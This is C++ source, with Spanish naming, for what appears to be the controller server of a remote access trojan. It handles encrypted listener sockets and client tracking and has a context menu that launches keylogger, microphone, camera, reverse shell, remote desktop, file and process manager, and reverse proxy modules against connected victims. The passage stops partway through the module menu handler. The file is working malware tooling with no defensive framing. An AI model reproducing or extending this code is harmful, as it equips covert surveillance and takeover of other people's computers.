void Servidor::m_AgregarListener(const std::string _nuevo_nombre, int _puerto, const char* _con_key) {
    std::unique_lock<std::mutex> lock(this->mtx_listeners);
    
    Servidor_Listener nuevo_listener;
    nuevo_listener.sckSocket = INVALID_SOCKET;
    nuevo_listener.strNombre = _nuevo_nombre;
    nuevo_listener.isRunning = false;
    nuevo_listener.iPuerto = _puerto;
    memset(nuevo_listener.con_key, 0, AES_KEY_LEN+1);

    strncpy(nuevo_listener.con_key, _con_key, AES_KEY_LEN);
    this->vc_Listeners.push_back(nuevo_listener);
}

void Servidor::m_BorrarListener(const std::string _nombre_listener) {
    //Remover listener del FD_SET maestro y cerrar conexiones activas

    std::unique_lock<std::mutex> lock(this->mtx_listeners);
    std::vector<Servidor_Listener>::iterator ntemp = this->vc_Listeners.begin();
    for (; ntemp != this->vc_Listeners.end(); ntemp++) {
        if(ntemp->strNombre == _nombre_listener) {
            //Cerrar socket, terminar conexiones???
            if (ntemp->sckSocket != INVALID_SOCKET) {
                closesocket(ntemp->sckSocket);
                ntemp->sckSocket = INVALID_SOCKET;
            }

            this->vc_Listeners.erase(ntemp);
            break;
        }
    }
}

void Servidor::m_ToggleListener(const std::string _nombre_listener) {
    std::unique_lock<std::mutex> lock(this->mtx_listeners);
    for (size_t i = 0; i < this->vc_Listeners.size(); i++) {
        if (this->vc_Listeners[i].strNombre == _nombre_listener) {
            //Cambiar estado del listener
            if (this->vc_Listeners[i].isRunning) {
                closesocket(this->vc_Listeners[i].sckSocket);
                this->vc_Listeners[i].sckSocket = INVALID_SOCKET;
                this->vc_Listeners[i].isRunning = false;
            }else {
                if (!this->Init_Socket(this->vc_Listeners[i].sckSocket, this->vc_Listeners[i].iPuerto, this->vc_Listeners[i].struct_Listener)) {
                    DEBUG_MSG("[Servidor::m_ToggleListener] No se pudo iniciar el listener " + this->vc_Listeners[i].strNombre);
                }else {
                    this->vc_Listeners[i].isRunning = true;
                    if (this->m_Running()) {
                        this->Init_Listen(this->vc_Listeners[i].sckSocket);
                    }
                }
            }
            break;
        }
    }
}

Servidor_Listener Servidor::m_ObtenerListener(SOCKET& _socket) {
    std::unique_lock<std::mutex> lock(this->mtx_listeners);
    Servidor_Listener nTemp;
    for (Servidor_Listener& listener : this->vc_Listeners) {
        if (listener.sckSocket == _socket) {
            nTemp = listener;
            break;
        }
    }
    return nTemp;
}

fd_set Servidor::m_CopiaFD() {
    std::unique_lock<std::mutex> lock(this->mtx_listeners);
    fd_set temp_fd;
    FD_ZERO(&temp_fd);
    for (size_t i = 0; i < this->vc_Listeners.size(); i++) {
        if (this->vc_Listeners[i].isRunning) {
            FD_SET(this->vc_Listeners[i].sckSocket, &temp_fd);
        }
    }
    return temp_fd;
}

std::vector<Listener_List_Data> Servidor::m_ListenerVectorCopy() {
    std::unique_lock<std::mutex> lock(this->mtx_listeners);
    std::vector<Listener_List_Data> vcOut;
    for (size_t i = 0; i < this->vc_Listeners.size(); i++) {
        Listener_List_Data ntemp;
        ntemp.nombre = this->vc_Listeners[i].strNombre;
        ntemp.clave_acceso = this->vc_Listeners[i].con_key;
        ntemp.puerto = std::to_string(this->vc_Listeners[i].iPuerto);
        ntemp.estado = this->vc_Listeners[i].isRunning ? "Habilitado" : "Deshabilitado";
        vcOut.push_back(ntemp);
    }

    return vcOut;
}

void Servidor::m_CerrarConexiones() {
    std::unique_lock<std::mutex> lock(vector_mutex);
    if (this->vc_Clientes.size() > 0) {
        for(int iIndex = 0; iIndex<int(this->vc_Clientes.size()); iIndex++){
            this->m_CerrarConexion(this->vc_Clientes[iIndex]->p_Cliente._sckCliente);
        }
    }
    
    m_CerrarConexion(this->sckSocket);
}

void Servidor::m_CleanVector() {
    while (true) {
        if (!this->m_Running()) {
            break;
        }
    
        std::this_thread::sleep_for(std::chrono::milliseconds(100));
        int iNumeroClientes = this->m_NumeroClientes(vector_mutex);
        if (iNumeroClientes == 0) {
            continue;
        }
        
        for(int iIndex = 0; iIndex < iNumeroClientes; iIndex++){
            if(!this->m_IsRunning(vector_mutex, iIndex) && this->m_Running()){
                std::string streTempID = this->m_ClienteID(vector_mutex, iIndex);
                
                this->m_RemoverClienteLista(streTempID);
                
                std::string strTmp = "Cliente " + this->m_ClienteIP(vector_mutex, iIndex) + " - desconectado";
                this->m_txtLog->LogThis(strTmp, LogType::LogMessage);

                //El vector cambia de tamaño, con esto se asegura obtener la posicion real
                int iRealIndex = this->IndexOf(this->m_ClienteID(vector_mutex, iIndex));
                this->m_BorrarCliente(vector_mutex, iRealIndex);
                
            }else if (!this->m_Running()) {
                //Cerra el loop y no iterar por todos si ya no esta escuchando
                break;
            }
        }
    }
    DEBUG_MSG("Thread CLEANER terminada");
    
    int iNumeroClientes = this->m_NumeroClientes(vector_mutex);
    for (int iIndex2 = 0; iIndex2 < iNumeroClientes; iIndex2++) {
        this->m_BorrarCliente(vector_mutex, iIndex2, true);
    }

    this->vc_Clientes.clear();
}

void Servidor::m_Escucha(){
    this->m_txtLog->LogThis("Thread LISTENER iniciada", LogType::LogMessage);
    
    struct timeval timeout;
    timeout.tv_sec = 1;
    timeout.tv_usec = 0;

    //Iniciar listen en todos los que esten habilitados
    std::unique_lock<std::mutex> lock(this->mtx_listeners);
    for (size_t i = 0; i < this->vc_Listeners.size(); i++) {
        if (this->vc_Listeners[i].isRunning) {
            this->Init_Listen(this->vc_Listeners[i].sckSocket);
        }
    }
    lock.unlock();

    
    while(this->m_Running()){
        fd_set fdMaster_copy = this->m_CopiaFD();  // Se obtiene lista de sockets que estan corriendo
        SOCKET tempSocket = INVALID_SOCKET;
        if (fdMaster_copy.fd_count <= 0) {
            std::this_thread::sleep_for(std::chrono::milliseconds(500));
            continue;
        }else {
            tempSocket = fdMaster_copy.fd_array[fdMaster_copy.fd_count - 1];
        }
        
        int iNumeroSockets = select(tempSocket +1, &fdMaster_copy, nullptr, nullptr, &timeout);
        for (int iCont = 0; iCont < iNumeroSockets; iCont++) {
            SOCKET iSock = fdMaster_copy.fd_array[iCont];

            DEBUG_MSG("[NUEVA CONEXION]...");

            //Nueva conexion
            struct ClientConInfo sckNuevoCliente = this->m_Aceptar(iSock);
            if (sckNuevoCliente._sckSocket == INVALID_SOCKET) {
                //socket invalido
                continue;
            }

            //Verificar si hay llave de cifrado para cliente
            Servidor_Listener nTemp = this->m_ObtenerListener(iSock);

            if (nTemp.strNombre == "") {
                DEBUG_MSG("[Servidor::m_Escucha] Error leyendo la key de los listeners o no existe");
                closesocket(sckNuevoCliente._sckSocket);
                sckNuevoCliente._sckSocket = INVALID_SOCKET;
                continue;
            }

            DEBUG_MSG("[Servidor::m_Escucha] Nueva conexion, listener: " + nTemp.strNombre);

            //IP:PUERTO
            std::string strtmpIP = sckNuevoCliente._strIp;
            strtmpIP.append(1, ':');
            strtmpIP.append(sckNuevoCliente._strPuerto);

            //RANDOM ID
            std::string strTmpId = RandomID(7);
            strTmpId.append(1, '-');
            strTmpId += std::to_string(sckNuevoCliente._sckSocket);

            struct Cliente structNuevoCliente;
            structNuevoCliente._sckCliente = sckNuevoCliente._sckSocket;
            structNuevoCliente._ttUltimaVez = time(0);
            structNuevoCliente._id = strTmpId;
            structNuevoCliente._strIp = strtmpIP;
            structNuevoCliente._strListener = nTemp.strNombre;

            //COPIAR LLAVE DE CIFRADO
            for (unsigned char i = 0; i < AES_KEY_LEN; i++) {
                structNuevoCliente.c_key.push_back(nTemp.con_key[i]);
            }

            //strncpy_s(structNuevoCliente.c_key, AES_KEY_LEN, nTemp.con_key, AES_KEY_LEN);

            std::string strTest = strtmpIP;
            std::string strTitle = "["+strTmpId+"] Nueva conexion";
                
            wxTheApp->CallAfter([strTest, strTitle] {
                std::shared_ptr<MyNotify> n_notify = MyNotify::Create(nullptr, strTitle, strTest, 5);
            });
                
            //Agregar el cliente al vector global - se agrega a la list una vez se reciba la info
            std::unique_lock<std::mutex> lock(vector_mutex);
            this->vc_Clientes.push_back(DBG_NEW Cliente_Handler(structNuevoCliente));
            this->vc_Clientes[this->vc_Clientes.size() - 1]->Spawn_Threads();
                
            this->m_InsertMutex(sckNuevoCliente._sckSocket);

        }
    }

    //Cerrar todos los listener
    std::unique_lock<std::mutex> lock2(this->mtx_listeners);
    for (Servidor_Listener& listener : this->vc_Listeners) {
        if (listener.sckSocket != INVALID_SOCKET) {
            closesocket(listener.sckSocket);
            listener.sckSocket = INVALID_SOCKET;
        }
    }

    DEBUG_MSG("DONE Listen");
}

int Servidor::IndexOf(std::string strID) {
    std::lock_guard<std::mutex> lock(vector_mutex);
    if (strID == "sofocante") { return -1; }
    bool isFound = false;
    int iIndex = 0;
    for (; iIndex < this->vc_Clientes.size(); iIndex++) {
        if (this->vc_Clientes[iIndex]->p_Cliente._id == strID) {
            isFound = true;
            break;
        }
    }
    
    if (!isFound) { iIndex = -1; }

    return iIndex;
}

void Servidor::m_InsertarCliente(struct Cliente& p_Cliente){
    std::unique_lock<std::mutex> lock(list_mutex);

    int iIndex = this->m_listCtrl->GetItemCount();

    this->m_listCtrl->InsertItem(iIndex, wxString(p_Cliente._id));
    this->m_listCtrl->SetItem(iIndex, 1, wxString(p_Cliente._strListener));
    this->m_listCtrl->SetItem(iIndex, 2, wxString(p_Cliente._strUser));
    this->m_listCtrl->SetItem(iIndex, 3, wxString(p_Cliente._strIp));
    this->m_listCtrl->SetItem(iIndex, 4, wxString(p_Cliente._strSo));
    this->m_listCtrl->SetItem(iIndex, 5, wxString(p_Cliente._strPID));
    this->m_listCtrl->SetItem(iIndex, 6, wxString(p_Cliente._strCpu));
}

void Servidor::m_RemoverClienteLista(std::string p_ID){
    std::unique_lock<std::mutex> lock(list_mutex);

    long lFound = this->m_listCtrl->FindItem(0, wxString(p_ID));
    if(lFound != wxNOT_FOUND){
        this->m_listCtrl->DeleteItem(lFound);
    } else{
        DEBUG_MSG("No se pudo encontrar el cliente " + p_ID);
    }
    
}

int Servidor::cChunkSend(SOCKET& pSocket, const char* pBuffer, int pLen, int pFlags, bool isBlock, int iTipoPaquete, ByteArray& c_key) {
    //Aqui hacer loop para enviar por partes el buffer
    int iEnviado      =    0;
    int iRestante     =    0;
    int iBytePos      =    0;
    int iChunkSize    =    0;
    int iChunkEnviado =    0;
    int iDataSize     = pLen;

    struct Paquete nPaquete;
    int iPaquet_Size = (sizeof(int) * 3) + PAQUETE_BUFFER_SIZE;
    char cPaqueteSer[(sizeof(int) * 3) + PAQUETE_BUFFER_SIZE];
    
    std::mutex* ntemp_mutex = this->m_GetMutex(pSocket).get();

    while (true) {
        iRestante = (iDataSize > iPaquet_Size) ? iDataSize - iPaquet_Size : iDataSize;

        //Si aun hay bytes por enviar
        if (iRestante > 0) {
            //Determinar el tamano el pedazo a enviar
            if (iRestante >= PAQUETE_BUFFER_SIZE) {
                iChunkSize = PAQUETE_BUFFER_SIZE;
            }
            else {
                //Leer el ultimo pedazo
                iChunkSize = iRestante;
            }
            iDataSize -= iChunkSize;

            //Armar paquete a serializar
            nPaquete.uiTipoPaquete =           iTipoPaquete;
            nPaquete.uiTamBuffer   =             iChunkSize;
            nPaquete.uiIsUltimo    = iDataSize == 0 ? 1 : 0;
            nPaquete.cBuffer.resize( iChunkSize );
            if (nPaquete.cBuffer.size() < iChunkSize) {
                DEBUG_MSG("[CHUNK] No se pudo reservar memoria");
                return SOCKET_ERROR;
            }

            int iFinalSize = (sizeof(int) * 3) + iChunkSize;
            
            memcpy(nPaquete.cBuffer.data(), pBuffer + iBytePos, iChunkSize);

            //Print_Packet(nPaquete);

            this->m_SerializarPaquete(nPaquete, cPaqueteSer);

            iChunkEnviado = this->cSend(pSocket, cPaqueteSer, iFinalSize, pFlags, ntemp_mutex, isBlock, 0, c_key);
            if (iChunkEnviado == SOCKET_ERROR || iChunkEnviado == WSAECONNRESET) {
                DEBUG_MSG("[CHUNK] Error enviando el chunk");
                return iChunkEnviado;
            }
            iEnviado += iChunkEnviado;
            iBytePos +=    iChunkSize;
        }else {
            break;
        }

    }

    return iEnviado;
}

int Servidor::send_all(SOCKET& pSocket, const char* pBuffer, int pLen, int pFlags) {
    int iEnviado = 0;
    int iTotalEnviado = 0;
    while (iTotalEnviado < pLen) {
        iEnviado = send(pSocket, pBuffer + iTotalEnviado, pLen - iTotalEnviado, pFlags);
        if (iEnviado == 0) {
            break;
        }else if (iEnviado == SOCKET_ERROR) {
            int error = WSAGetLastError();
            if (error == WSAEWOULDBLOCK) {
                //Aun no se puede escribir
                std::this_thread::sleep_for(std::chrono::milliseconds(10));
                continue;
            }else if(error == WSAECONNRESET){
                //Error en el envio
                return SOCKET_ERROR;
            }else {
                //Error en el envio
                return SOCKET_ERROR;
            }
        }
        iTotalEnviado += iEnviado;
    }

    return iTotalEnviado;
}

int Servidor::cSend(SOCKET& pSocket, const char* pBuffer, int pLen, int pFlags, std::mutex*& mtx_obj, bool isBlock, int iTipoPaquete, ByteArray& c_key) {
    // 1 non block
    // 0 block
    std::mutex* tmp_mutex;
    if (!mtx_obj) {
        tmp_mutex = &this->p_mutex; //mutex por defecto
    }else {
        tmp_mutex = mtx_obj;
    }
    std::unique_lock<std::mutex> lock(*tmp_mutex);

    //Tamaño del buffer
    int iDataSize = pLen;

    //Vector que aloja el buffer cifrado
    ByteArray cData = this->bEnc(reinterpret_cast<const unsigned char*>(pBuffer), iDataSize, c_key);
    iDataSize = cData.size();
    if (iDataSize == 0) {
        ERROR_EW("Error encriptando los datos a enviar");
        return 0;
    }

    //Enviar al inicio el size del paquete
    std::vector<char> cBufferFinal(iDataSize + sizeof(int));
    memcpy(cBufferFinal.data(), &iDataSize, sizeof(int));
    memcpy(cBufferFinal.data() + sizeof(int), cData.data(), iDataSize);
    
    iDataSize += sizeof(int);

    int iEnviado = 0;
    unsigned long int iBlock = 0;

    if (isBlock) {
        //Hacer el socket block
        if (ioctlsocket(pSocket, FIONBIO, &iBlock) != 0) {
            DEBUG_MSG("[cSend]Error configurando el socket NON_BLOCK");
        }
    }

    iEnviado = send_all(pSocket, cBufferFinal.data(), iDataSize, pFlags);

    //Restaurar
    if (isBlock) {
        iBlock = 1;
        if (ioctlsocket(pSocket, FIONBIO, &iBlock) != 0) {
            DEBUG_MSG("[cSend]Error configurando el socket NON_BLOCK");
        }
    }
    
    return iEnviado;
}

int Servidor::recv_all(SOCKET& pSocket, char* pBuffer, int pLen, int pFlags) {
    int iRecibido = 0;
    int iTotalRecibido = 0;
    while (iTotalRecibido < pLen) {
        iRecibido = recv(pSocket, pBuffer + iTotalRecibido, pLen - iTotalRecibido, pFlags);
        if (iRecibido == 0) {
            //Se cerro el socket
            break;
        }else if (iRecibido == SOCKET_ERROR) {
            int error = WSAGetLastError();
            if (error == WSAEWOULDBLOCK) {
                //Aun no se puede leer
                std::this_thread::sleep_for(std::chrono::milliseconds(10));
                continue;
            }else if(error == WSAECONNRESET){
                //Ocurrio un error
                return SOCKET_ERROR;
            }else {
                //Ocurrio un error
                return SOCKET_ERROR;
            }
        }
        iTotalRecibido += iRecibido;
    }

    return iTotalRecibido;
}

int Servidor::cRecv(SOCKET& pSocket, std::vector<char>& pBuffer, int pFlags, bool isBlock, DWORD* error_code, ByteArray& c_key) {
    
    // 1 non block
    // 0 block
    
    int          iRecibido = SOCKET_ERROR;
    int               temp_error_code = 0;
    unsigned long int          iBlock = 0;
    std::vector<char>         cRecvBuffer;
    bool               bErrorFlag = false;
    if (isBlock) {
        //Hacer el socket block
        if (ioctlsocket(pSocket, FIONBIO, &iBlock) != 0) {
            DEBUG_MSG("[cRecv]Error configurando el socket NON_BLOCK");
        }
    }

    //Leer primero sizeof(int) para obtener el total de bytes a leer
    char cBuffSize[sizeof(int)];
    int iPaqueteSize = recv(pSocket, cBuffSize, sizeof(int), pFlags);
    if (error_code != nullptr) {
        *error_code = WSAGetLastError();
    }
    if (iPaqueteSize == sizeof(int)) {
        memcpy(&iPaqueteSize, cBuffSize, sizeof(int));
        if (iPaqueteSize > 0 && iPaqueteSize < MAX_PAQUETE_SIZE) {
            cRecvBuffer.resize(iPaqueteSize);
            iRecibido = this->recv_all(pSocket, cRecvBuffer.data(), iPaqueteSize, pFlags);
            if (error_code != nullptr) {
                *error_code = WSAGetLastError();
            }
            if (iRecibido == SOCKET_ERROR) {
                DEBUG_MSG("No se pudo leer nada recv_all.");
                bErrorFlag = true;
            }
        }else {
            DEBUG_MSG("Error parseando entero");
            DEBUG_MSG(iPaqueteSize);
            bErrorFlag = true;
        }
    }else if (iPaqueteSize == SOCKET_ERROR) {
        bErrorFlag = true;
    }
    
    //Restaurar el socket
    if (isBlock) {
        iBlock = 1;
        if (ioctlsocket(pSocket, FIONBIO, &iBlock) != 0) {
            DEBUG_MSG("[1][cRecv]Error configurando el socket NON_BLOCK:");
            DEBUG_MSG(iRecibido);
        }
    }

    if (bErrorFlag || iRecibido == SOCKET_ERROR) {
        return iRecibido;
    }

    //Decrypt
    ByteArray bOut = this->bDec(reinterpret_cast<const unsigned char*>(cRecvBuffer.data()), iRecibido, c_key);
    iRecibido = bOut.size();
    if (iRecibido == 0) {
        ERROR_EW("[cRecv] Error desencriptando los datos recibidos");
        return 0;
    }

    pBuffer.resize(iRecibido);
    if (pBuffer.size() == iRecibido) {
        memcpy(pBuffer.data(), bOut.data(), iRecibido);
    }else {
        DEBUG_MSG("[cRecv] No se pudo reservar memoria en el buffer de salida");
        return 0;
    }
    return iRecibido;
}

void Servidor::m_SerializarPaquete(const Paquete& paquete, char* cBuffer) {
    memcpy(cBuffer, &paquete.uiTipoPaquete, sizeof(paquete.uiTipoPaquete));
    memcpy(cBuffer + sizeof(paquete.uiTipoPaquete), &paquete.uiTamBuffer, sizeof(paquete.uiTamBuffer));
    memcpy(cBuffer + sizeof(paquete.uiTipoPaquete) + sizeof(paquete.uiTamBuffer), &paquete.uiIsUltimo, sizeof(paquete.uiIsUltimo));
    memcpy(cBuffer + sizeof(paquete.uiTipoPaquete) + sizeof(paquete.uiTamBuffer) + sizeof(paquete.uiIsUltimo), paquete.cBuffer.data(), paquete.uiTamBuffer);
}

bool Servidor::m_DeserializarPaquete(const char* cBuffer, Paquete& paquete, int bufer_size) {
    if (bufer_size < PAQUETE_MINIMUM_SIZE) { return false; }
    memcpy(&paquete.uiTipoPaquete, cBuffer, sizeof(paquete.uiTipoPaquete));
    memcpy(&paquete.uiTamBuffer, cBuffer + sizeof(paquete.uiTipoPaquete), sizeof(paquete.uiTamBuffer));
    memcpy(&paquete.uiIsUltimo, cBuffer + sizeof(paquete.uiTipoPaquete) + sizeof(paquete.uiTamBuffer), sizeof(paquete.uiIsUltimo));
    
    if (paquete.uiTamBuffer > 0 && paquete.uiTamBuffer < MAX_PAQUETE_SIZE) {
        paquete.cBuffer.resize(paquete.uiTamBuffer);
    }else {
        return false;
    }

    if (paquete.cBuffer.size() == paquete.uiTamBuffer) {
        memcpy(paquete.cBuffer.data(), cBuffer + sizeof(paquete.uiTipoPaquete) + sizeof(paquete.uiTamBuffer) + sizeof(paquete.uiIsUltimo), paquete.uiTamBuffer);
    }else {
        ERROR_EW("[Deserializar] No se pudo reservar memoria para el buffer");
        return false;
    }
    return true;
}

void Servidor::m_BorrarCliente(std::mutex& mtx, int iIndex, bool isEnd) {
    std::unique_lock<std::mutex> lock(mtx);
    if (iIndex < static_cast<int>(this->vc_Clientes.size()) && iIndex >= 0) {
        if (this->vc_Clientes[iIndex]) {
            //this->cChunkSend(this->vc_Clientes[iIndex]->p_Cliente._sckCliente, DUMMY_PARAM, sizeof(DUMMY_PARAM), 0, false, EnumComandos::CLI_KSWITCH);
            this->m_DeleteMutex(this->vc_Clientes[iIndex]->p_Cliente._sckCliente);

            m_CerrarConexion(this->vc_Clientes[iIndex]->p_Cliente._sckCliente);
            this->vc_Clientes[iIndex]->Stop();
            this->vc_Clientes[iIndex]->JoinThread();
            //this->vc_Clientes[iIndex]->m_setFrameVisible(false);
            delete this->vc_Clientes[iIndex];
            this->vc_Clientes[iIndex] = nullptr;

            if (!isEnd) { this->vc_Clientes.erase(vc_Clientes.begin() + iIndex); }

        }
    }
}

//AES256
ByteArray Servidor::bEnc(const unsigned char* pInput, size_t pLen, ByteArray c_key) {
    ByteArray bOutput;
    //ByteArray::size_type enc_len = Aes256::encrypt(this->bKey, pInput, pLen, bOutput);
    ByteArray::size_type enc_len = Aes256::encrypt(c_key, pInput, pLen, bOutput);
    if (enc_len <= 0) {
        DEBUG_MSG("[Servidor::bEnc] Error encriptando:");
        DEBUG_MSG(pInput);
    }
    return bOutput;
}

ByteArray Servidor::bDec(const unsigned char* pInput, size_t pLen, ByteArray c_key) {
    ByteArray bOutput;
    //ByteArray::size_type dec_len = Aes256::decrypt(this->bKey, pInput, pLen, bOutput);
    ByteArray::size_type dec_len = Aes256::decrypt(c_key, pInput, pLen, bOutput);
    if (dec_len <= 0) {
        DEBUG_MSG("[Servidor::bEnc] Error desencriptando:");
        DEBUG_MSG(pInput);
    }
    return bOutput;
}

std::shared_ptr<std::mutex> Servidor::m_GetMutex(SOCKET pSocket) {
    std::unique_lock<std::mutex> lock(this->mtx_map);
    if (this->vcMutex.find(pSocket) != this->vcMutex.end()) {
        return this->vcMutex[pSocket];
    }
    return nullptr;
}

void Servidor::m_InsertMutex(SOCKET pSocket) {
    std::unique_lock<std::mutex> lock(this->mtx_map);
    std::shared_ptr<std::mutex> th = std::make_shared<std::mutex>();
	this->vcMutex.insert({ pSocket, th });
}

void Servidor::m_DeleteMutex(SOCKET pSocket) {
    std::unique_lock<std::mutex> lock(this->mtx_map);
    if (this->vcMutex.find(pSocket) != this->vcMutex.end()) {
        this->vcMutex.erase(pSocket);
    }
}

int Servidor::m_NumeroClientes(std::mutex& mtx) {
    std::unique_lock<std::mutex> lock(mtx);
    return static_cast<int>(this->vc_Clientes.size());
}

SOCKET Servidor::m_SocketCliente(std::mutex& mtx, int iIndex) {
    std::unique_lock<std::mutex> lock(mtx);
    if (iIndex < static_cast<int>(this->vc_Clientes.size())) {
        if (this->vc_Clientes[iIndex]) {
            return this->vc_Clientes[iIndex]->p_Cliente._sckCliente;
        }
    }
    return INVALID_SOCKET;
}

std::string Servidor::m_ClienteID(std::mutex& mtx, int iIndex) {
    std::unique_lock<std::mutex> lock(mtx);
    if (iIndex < static_cast<int>(this->vc_Clientes.size())) {
        if (this->vc_Clientes[iIndex]) {
            return this->vc_Clientes[iIndex]->p_Cliente._id;
        }
    }
    return std::string("sofocante");
}

std::string Servidor::m_ClienteIP(std::mutex& mtx, int iIndex) {
    std::unique_lock<std::mutex> lock(mtx);
    if (iIndex < static_cast<int>(this->vc_Clientes.size())) {
        if (this->vc_Clientes[iIndex]) {
            return this->vc_Clientes[iIndex]->p_Cliente._strIp;
        }
    }
    return std::string("sofocante");
}

bool Servidor::m_IsRunning(std::mutex& mtx, int iIndex) {
    std::unique_lock<std::mutex> lock(mtx);
    bool bFlag = false;
    if (iIndex < static_cast<int>(this->vc_Clientes.size())) {
        if (this->vc_Clientes[iIndex]) {
            bFlag = this->vc_Clientes[iIndex]->isfRunning();

        }
    }
    return bFlag;
}

bool Servidor::m_Running() {
    std::unique_lock<std::mutex> lock(this->p_mutex);
    return this->p_Escuchando;
}

Servidor::~Servidor() {
    if (sckSocket != INVALID_SOCKET) {
        closesocket(sckSocket);
        sckSocket = INVALID_SOCKET;
    }

    if (m_txtLog != nullptr) {
        delete m_txtLog;
        m_txtLog = nullptr;
    }

    if (modRerverseProxy) {
        delete modRerverseProxy;
        modRerverseProxy = nullptr;
    }
    
    WSACleanup();
}

//Mostrar menu contextual frame princiopal
void MyListCtrl::ShowContextMenu(const wxPoint& pos, long item) {
    DEBUG_MSG(this->strTmp);
    int iCliIndex = p_Servidor->IndexOf(this->strTmp.ToStdString());
    if (iCliIndex != -1) {
        this->iClienteID = iCliIndex;
        wxMenu menu;
        wxMenu* subMenuSpy = nullptr; // = new wxMenu;
        wxMenu* subMenuMisc = nullptr; //new wxMenu;
        wxMenu* subMenuRed = nullptr; // new wxMenu;

        std::vector<std::string> vcMods = p_Servidor->vc_Clientes[iCliIndex]->vc_GetMods();
        if (vcMods.size() > 0) {
            for (std::string& item : vcMods) {
                //Vigilancia
                if (item == "Microfono"){
                    if (!subMenuSpy) subMenuSpy = new wxMenu;
                    subMenuSpy->Append(EnumMenuMods::ID_OnMicrofono, item);
                    continue;
                } 
                if (item == "Keylogger") {
                    if (!subMenuSpy) subMenuSpy = new wxMenu;
                    subMenuSpy->Append(EnumMenuMods::ID_OnKeyloger, item);
                    continue;
                }
                if (item == "Camara") {
                    if (!subMenuSpy) subMenuSpy = new wxMenu;
                    subMenuSpy->Append(EnumMenuMods::ID_OnCamara, item);
                    continue;
                }


                //Misc
                if (item == "Administrador de Ventanas"){
                    if (!subMenuMisc) subMenuMisc = new wxMenu;
                    subMenuMisc->Append(EnumMenuMods::ID_OnAdminVentanas, item);
                    continue;
                }
                if (item == "Bromas") {
                    if (!subMenuMisc) subMenuMisc = new wxMenu;
                    subMenuMisc->Append(EnumMenuMods::ID_OnBromas, item);
                    continue;
                }



                //Red
                if (item == "Escaner de Red"){
                    if (!subMenuRed) subMenuRed = new wxMenu;
                    subMenuRed->Append(EnumMenuMods::ID_OnEscanerRed, item);
                    continue;
                }
                if (item == "Proxy Inversa") {
                    if (!subMenuRed) subMenuRed = new wxMenu;
                    subMenuRed->Append(EnumMenuMods::ID_OnProxyInversa, item);
                    continue;
                }



                //Shell
                if (item == "Shell Inversa") {
                    menu.Append(EnumMenuMods::ID_OnShell, item);
                    continue;
                }

                //Escritorio Remoto
                if (item == "Escritorio Remoto") {
                    menu.Append(EnumMenuMods::ID_OnEscritorioRemoto, item);
                    continue;
                }

                //Informacion
                if (item == "Informacion") {
                    menu.Append(EnumMenuMods::ID_OnInfo, item);
                    continue;
                }

                //Administrador de Archivos
                if (item == "Administrador de Archivos") {
                    menu.Append(EnumMenuMods::ID_OnAdminArchivos, item);
                    continue;
                }

                //Admin de Procesos
                if (item == "Admin Procesos") {
                    menu.Append(EnumMenuMods::ID_OnAdminProcesos, item);
                    continue;
                }
            }

            if (subMenuSpy) {
                if (subMenuSpy->GetMenuItemCount() > 0) {
                    menu.AppendSubMenu(subMenuSpy, "Vigilancia");
                }
            }
            if (subMenuMisc) {
                if (subMenuMisc->GetMenuItemCount() > 0) {
                    menu.AppendSubMenu(subMenuMisc, "Miscelaneo");
                }
            }
            if (subMenuRed) {
                if (subMenuRed->GetMenuItemCount() > 0) {
                    menu.AppendSubMenu(subMenuRed, "Red");
                }
            }
            menu.AppendSeparator();
        }

        wxMenu* subMenu1 = new wxMenu;
        subMenu1->Append(EnumIDS::ID_CerrarProceso, "Matar proceso");
        subMenu1->Append(EnumIDS::ID_ReiniciarCliente, "Reiniciar conexion")->Enable(false);
        subMenu1->Append(wxID_ANY, "Actualizar cliente")->Enable(false);
        subMenu1->Append(wxID_ANY, "Desinstalar cliente")->Enable(false);
        
        menu.AppendSubMenu(subMenu1, "Cliente");

        PopupMenu(&menu, pos.x, pos.y);
    }
}

void MyListCtrl::OnContextMenu(wxContextMenuEvent& event){
    if (GetEditControl() == NULL)
    {
        wxPoint point = event.GetPosition();

        // If from keyboard
        if ((point.x == -1) && (point.y == -1))
        {
            wxSize size = GetSize();
            point.x = size.x / 2;
            point.y = size.y / 2;
        }
        else
        {
            point = ScreenToClient(point);
        }

        int flags;
        long iItem = HitTest(point, flags);

        if (iItem == -1) {
            return;
        }

        wxString st1 = this->GetItemText(iItem, 0);
        this->strTmp = st1;

        ShowContextMenu(point, iItem);
    }
    else
    {
        event.Skip();
    }
}

void MyListCtrl::OnInteractuar(wxCommandEvent& event) {
    /*std::vector<std::string> vcOut = strSplit(this->strTmp.ToStdString(), '/', 1);
    int iCliIndex = p_Servidor->IndexOf(vcOut[0]);
    
    if (iCliIndex != -1) {
        p_Servidor->vc_Clientes[iCliIndex]->CrearFrame(this->strTmp.ToStdString(), vcOut[0]);
    }*/
    event.Skip();
}

void MyListCtrl::OnActivated(wxListEvent& event) {
    /*if (this->GetItemCount() > 0) {
        wxString strID = this->GetItemText(event.GetIndex(), 0);
        std::unique_lock<std::mutex> lock(vector_mutex);
        for (auto& cliente : p_Servidor->vc_Clientes) {
            if (cliente->p_Cliente._id == strID.ToStdString()) {
                lock.unlock();
                
                wxString st1 = this->GetItemText(event.GetIndex(), 0);
                st1.append(1, '/');
                st1 += this->GetItemText(event.GetIndex(), 1);
                st1.append(1, '/');
                st1 += this->GetItemText(event.GetIndex(), 2);
                cliente->CrearFrame(st1.ToStdString(), strID.ToStdString());
                break;
            }
        }
    }*/
    event.Skip();
}

void MyListCtrl::OnRefrescar(wxCommandEvent& event) {
    this->DeleteAllItems();
    std::unique_lock<std::mutex> lock(vector_mutex);

    for (auto& cliente : p_Servidor->vc_Clientes) {
        p_Servidor->m_InsertarCliente(cliente->p_Cliente);
    }
}

//Eventos menu de mods habilitados
void MyListCtrl::OnModMenu(wxCommandEvent& event) {
    const int menuID = event.GetId();

    SOCKET tmpSocket = p_Servidor->vc_Clientes[this->iClienteID]->p_Cliente._sckCliente;
    ByteArray& c_key = p_Servidor->vc_Clientes[this->iClienteID]->p_Cliente.c_key;

    if (menuID == EnumMenuMods::ID_OnShell) {
        panelReverseShell* panelShell = new panelReverseShell(this, tmpSocket, this->strTmp.ToStdString(), c_key);
        panelShell->Show();
    } else if (menuID == EnumMenuMods::ID_OnMicrofono) {
        panelMicrophone* panelMic = new panelMicrophone(this, tmpSocket, this->strTmp.ToStdString(), c_key);
        panelMic->Show();
    }else if (menuID == EnumMenuMods::ID_OnKeyloger) {
        panelKeylogger* panelKey = new panelKeylogger(this, tmpSocket, this->strTmp.ToStdString(), c_key);
        panelKey->Show();
    }
